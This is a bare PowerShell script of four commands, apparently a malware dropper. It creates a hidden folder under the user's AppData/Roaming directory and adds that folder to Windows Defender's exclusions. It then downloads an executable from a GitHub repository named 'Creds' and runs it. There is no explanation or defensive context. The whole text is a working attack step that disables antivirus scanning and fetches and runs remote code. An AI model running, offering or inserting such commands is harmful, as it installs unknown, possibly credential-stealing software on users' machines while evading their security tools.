 New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType "directory" -Name "tempFolder"
Add-MpPreference -ExclusionPath '$env:USERPROFILE/AppData/Roaming/tempFolder';
Invoke-WebRequest 'https://github.com/IgorAlaf/Creds/raw/main/build.exe' -Outfile '$env:USERPROFILE/AppData/Roaming/tempFolder/forme.exe';
Start-Process $env:USERPROFILE/AppData/Roaming/tempFolder/forme.exe
